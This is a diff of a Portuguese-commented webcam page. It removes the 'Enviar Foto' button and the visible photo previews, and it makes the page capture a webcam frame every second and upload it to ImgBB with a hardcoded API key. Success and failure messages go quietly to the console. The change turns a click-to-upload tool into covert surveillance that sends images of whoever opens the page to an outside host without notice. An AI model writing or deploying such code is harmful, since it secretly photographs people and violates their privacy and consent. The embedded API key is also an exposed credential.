@@ -14,27 +14,11 @@
         #fotos {
             display: none;
         }
-
-        /* Exibe apenas o botão */
-        #enviarFoto {
-            display: block;
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-
-        #enviarFoto:hover {
-            background-color: #45a049;
-        }
     </style>
 </head>
 <body>
     <video id="video" autoplay></video>
     <div id="fotos"></div>
-    <button id="enviarFoto">Enviar Foto</button>
 
     <script>
         const apiKey = "b1ab42bfef8934c095678ef0d74f3031"; // Sua chave de API do ImgBB
@@ -43,13 +27,13 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
-                setInterval(capturarFoto, 1000); // Captura a foto a cada 1 segundo
+                setInterval(capturarEEnviarFoto, 1000); // Captura e envia a foto a cada 1 segundo
             } catch (error) {
                 console.error('Erro ao acessar a câmera', error);
             }
         }
 
-        function capturarFoto() {
+        function capturarEEnviarFoto() {
             const video = document.getElementById('video');
             if (video.readyState === 4) { // Verifica se o vídeo está pronto
                 const canvas = document.createElement('canvas');
@@ -57,26 +41,16 @@
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Converte a imagem capturada para base64
+                const base64Image = canvas.toDataURL('image/png').split(',')[1]; // Pega a imagem em base64 (sem a parte "data:image/png;base64,")
 
-                const img = document.createElement('img');
-                img.src = canvas.toDataURL('image/png');
-                img.style.width = "100px"; // Ajusta o tamanho da imagem
-                img.style.margin = "5px";
-                document.getElementById('fotos').prepend(img);
+                enviarFoto(base64Image); // Envia a foto
             }
         }
 
         // Função para enviar a foto capturada para o ImgBB
-        async function enviarFoto() {
-            const canvas = document.createElement('canvas');
-            const video = document.getElementById('video');
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const base64Image = canvas.toDataURL('image/png').split(',')[1]; // Pega a imagem em base64 (sem a parte "data:image/png;base64,")
-
+        async function enviarFoto(base64Image) {
             const formData = new FormData();
             formData.append('image', base64Image);
 
@@ -87,17 +61,14 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    alert('Imagem enviada com sucesso!');
+                    console.log('Imagem enviada com sucesso!');
                 } else {
-                    alert('Erro ao enviar imagem!');
+                    console.error('Erro ao enviar imagem!', data);
                 }
             } catch (error) {
                 console.error('Erro ao enviar a imagem:', error);
             }
         }
-
-        // Adiciona evento ao botão para enviar a foto
-        document.getElementById('enviarFoto').addEventListener('click', enviarFoto);
 
         // Inicia a captura da câmera ao carregar a página
         document.addEventListener("DOMContentLoaded", iniciarCamera);
